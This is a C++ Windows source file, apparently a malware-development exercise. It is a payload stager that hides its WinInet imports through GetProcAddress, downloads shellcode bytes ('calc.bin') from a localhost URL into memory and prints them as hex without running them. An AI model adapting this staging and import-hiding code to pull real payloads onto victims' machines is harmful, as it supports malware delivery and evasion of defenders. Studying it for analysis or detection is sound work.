#include <Windows.h>
#include <WinInet.h> 
#include <cstdio>
#include <cstdlib>
#include <iostream>

using MyInternetOpenW = HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
using MyInternetOpenUrlW = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
using MyInternetReadFile = BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD);

#define PAYLOAD L"http://127.0.0.1:8080/static/calc.bin"

BOOL GetPayloadFromUrl(MyInternetOpenW pInternetOpenW, MyInternetOpenUrlW pInternetOpenUrlW, MyInternetReadFile pInternetReadFile, LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL bSTATE = TRUE;

    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL;
    PBYTE pTmpBytes = NULL;

    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
    hInternet = pInternetOpenW(L"Proxy", NULL, NULL, NULL, 0);

    if (hInternet == NULL) {
        std::wcout << L"[!] InternetOpenW() Failed with Error: " << GetLastError() << std::endl;
        bSTATE = FALSE;
        goto cleanup;
    }

    // Opening the handle to the payload using the payload's URL
    hInternetFile = pInternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);

    if (hInternetFile == NULL) {
        std::wcout << L"[!] InternetOpenUrlW Failed with Error: " << GetLastError() << std::endl;
        bSTATE = FALSE;
        goto cleanup;
    }

    // Allocating 1024 bytes to the temp buffer
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        std::wcout << L"[!] LocalAlloc() Failed with Error: " << GetLastError() << std::endl;
        bSTATE = FALSE;
        goto cleanup;
    }

    while (TRUE) {

        // Reading 1024 bytes to the tmp buffer, The function will read less bytes in case the file is smaller than 1024 bytes
        if (!pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            std::wcout << L"[!] InternetReadFile() Failed with Error: " << GetLastError() << std::endl;
            bSTATE = FALSE;
            goto cleanup;
        }

        // Calculating the total size of the total buffer
        sSize += dwBytesRead;

        // In case the totla buffer is not allocated yet
        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        } else {
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto cleanup;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024 || dwBytesRead == 0) {
            break;
        }

        // Otherwise, read the next 1024 bytes

    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

    //
    cleanup:
        if (hInternet) {
            InternetCloseHandle(hInternet);
        }
        if (hInternetFile) {
            InternetCloseHandle(hInternetFile);
        }
        if (pTmpBytes) {
            LocalFree(pTmpBytes);
        }
        return bSTATE;
}

int main() {
    SIZE_T Size = 0;
    PBYTE pPayload = NULL;

    HMODULE hModule = GetModuleHandleW(L"wininet.dll");
    if (hModule == NULL) {
        wprintf(L"[!] GetModuleHandleW() Failed with Error: %d\n", GetLastError());
        return -1;
    }

    MyInternetOpenW pInternetOpenW = reinterpret_cast<MyInternetOpenW>(GetProcAddress(hModule, "InternetOpenW"));
    MyInternetOpenUrlW pInternetOpenUrlW = reinterpret_cast<MyInternetOpenUrlW>(GetProcAddress(hModule, "InternetOpenUrlW"));
    MyInternetReadFile pInternetReadFile = reinterpret_cast<MyInternetReadFile>(GetProcAddress(hModule, "InternetReadFile"));
    if (!pInternetOpenW || !pInternetOpenUrlW || !pInternetReadFile) {
        wprintf(L"[!] GetProcAddress() Failed with Error: %d\n", GetLastError());
        return -1;
    }

    if (!GetPayloadFromUrl(pInternetOpenW, pInternetOpenUrlW, pInternetReadFile, PAYLOAD, &pPayload, &Size)) {
        wprintf(L"[!] GetPayloadFromUrl() Failed with Error: %d\n", GetLastError());
        return -1;
    }

    printf("[i] Bytes : 0x%p \n", pPayload);
    printf("[i] Size  : %ld \n", Size);

    // Printing it
    for (int i = 0; i < Size; i++){
        if (i % 16 == 0)
            printf("\n\t");

        printf("%0.2X ", pPayload[i]);
    }
    printf("\n\n");

    // Freeing
    LocalFree(pPayload);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
